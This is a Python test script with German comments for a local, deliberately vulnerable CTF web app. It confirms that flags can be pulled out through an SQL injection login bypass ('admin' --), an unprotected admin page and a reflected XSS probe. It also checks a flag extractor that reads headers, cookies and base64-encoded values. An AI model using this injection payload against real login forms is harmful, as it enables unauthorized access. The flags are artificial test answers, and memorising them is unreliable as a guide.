#!/usr/bin/env python3
"""
verify.py - Probelauf-Check fuer vuln-web (reines Python 3.13 stdlib).

Zieht die drei Flags ueber ihre Ausnutzungspfade, vergleicht sie mit den
erwarteten Werten und meldet per Exit-Code:
    0  alle Checks gruen
    1  mindestens einer fehlt oder weicht ab

Zusaetzlich zum Happy Path (drei klassische Luecken) werden die Flag-VARIANTEN
geprueft: derselbe (eigene) Flag an bewusst versteckten Stellen - im Header, im
Cookie, base64-kodiert, nested im JSON. Das ist der Gegentest fuer die zentrale
Extraktion: eine reine Body-Klartext-Suche wuerde hier scheitern, eine Extraktion
ueber Body + Header + Dekodierung zieht ihn trotzdem.

Start:   python verify.py            (Standardport 8000)
         python verify.py 8080       (eigener Port)

Setzt voraus, dass app.py bereits laeuft.
"""

from __future__ import annotations

import base64
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

# Erwartete Flags - muessen zu app.py passen.
EXPECTED = {
    "SQLi (Login)":      "FLAG{sqli-login-bypass-7Qk2pL}",
    "BAC  (Admin)":      "FLAG{broken-access-admin-9Lm5xR}",
    "XSS  (Reflected)":  "FLAG{reflected-xss-3Zt8wN}",
}

# Der an versteckten Stellen ausgelieferte Varianten-Flag (eigene secrets-Zeile).
FLAG_VARIANT = "FLAG{hidden-variant-Qw9zY4}"

FLAG_RE = re.compile(r"FLAG\{[^}]+\}")
# base64/base64url-aussehende Tokens (fuer kodierte Varianten).
_B64_RE = re.compile(r"[A-Za-z0-9+/_-]{16,}={0,2}")


def fetch_full(url: str, data: bytes | None = None) -> tuple[str, object]:
    """Holt eine URL und gibt ``(body, headers)`` zurueck. Body '' und headers None
    bei Netz-/Verbindungsfehler; eine HTTP-Fehlerseite (z. B. 401) liefert beides."""
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.read().decode("utf-8", "replace"), resp.headers
    except urllib.error.HTTPError as exc:
        return exc.read().decode("utf-8", "replace"), exc.headers
    except (urllib.error.URLError, OSError) as exc:
        print(f"  ! Verbindungsfehler fuer {url}: {exc}", file=sys.stderr)
        return "", None


def fetch(url: str, data: bytes | None = None) -> str:
    """Nur der Body (Happy-Path-Checks suchen den Flag im sichtbaren Body)."""
    return fetch_full(url, data)[0]


def first_flag(body: str) -> str | None:
    match = FLAG_RE.search(body)
    return match.group(0) if match else None


def extract(body: str, headers: object = None) -> str | None:
    """Mini-Mirror der zentralen Extraktion (ctf-ops common.flagextract) fuer den
    standalone Selbsttest: scannt Body PLUS alle Header-Werte, und wenn dort kein
    Klartext-Flag steht, werden base64/base64url-aussehende Tokens dekodiert und
    erneut geprueft. (ctf-ops selbst nutzt die echte zentrale Funktion.)"""
    parts = [body or ""]
    if headers is not None:
        try:
            parts.extend(f"{k}: {v}" for k, v in headers.items())
        except Exception:
            parts.append(str(headers))
    text = "\n".join(parts)
    m = FLAG_RE.search(text)
    if m:
        return m.group(0)
    for tok in _B64_RE.findall(text):
        pad = tok.replace("-", "+").replace("_", "/")
        pad = pad + "=" * (-len(pad) % 4)
        try:
            dec = base64.b64decode(pad, validate=False).decode("utf-8", "replace")
        except Exception:
            continue
        m = FLAG_RE.search(dec)
        if m:
            return m.group(0)
    return None


def main() -> int:
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
    base = f"http://127.0.0.1:{port}"

    # --- Happy Path: je Schwachstelle der Ausnutzungspfad aus der README. ----
    login_body = urllib.parse.urlencode(
        {"username": "admin' --", "password": "x"}
    ).encode("utf-8")

    results = {
        "SQLi (Login)":     first_flag(fetch(f"{base}/login", data=login_body)),
        "BAC  (Admin)":     first_flag(fetch(f"{base}/admin")),
        "XSS  (Reflected)": first_flag(
            fetch(f"{base}/hello?name=" + urllib.parse.quote("<b>x</b>"))
        ),
    }

    print(f"vuln-web Probelauf gegen {base}")
    all_ok = True
    for name, expected in EXPECTED.items():
        got = results[name]
        if got == expected:
            print(f"  [OK]   {name}: {got}")
        elif got is None:
            print(f"  [FEHLT] {name}: keine Flag erhalten (erwartet {expected})")
            all_ok = False
        else:
            print(f"  [ABW]  {name}: {got} (erwartet {expected})")
            all_ok = False

    # --- Varianten: derselbe Flag an versteckten Stellen -> zentrale Extraktion.
    print(f"Flag-Varianten (versteckt) gegen {base}")
    for kind in ("header", "cookie", "base64", "json", "b64json"):
        body, headers = fetch_full(f"{base}/variant?kind={kind}")
        got = extract(body, headers)
        # Gegenprobe: im sichtbaren Body darf (ausser bei json) KEIN Klartext-Flag
        # stehen - sonst wuerde der Test die versteckte Stelle gar nicht pruefen.
        if got == FLAG_VARIANT:
            print(f"  [OK]   variant/{kind}: {got}")
        elif got is None:
            print(f"  [FEHLT] variant/{kind}: nicht extrahiert (erwartet {FLAG_VARIANT})")
            all_ok = False
        else:
            print(f"  [ABW]  variant/{kind}: {got} (erwartet {FLAG_VARIANT})")
            all_ok = False

    print("Ergebnis:", "GRUEN - alle Checks" if all_ok else "ROT - unvollstaendig")
    return 0 if all_ok else 1


if __name__ == "__main__":
    sys.exit(main())
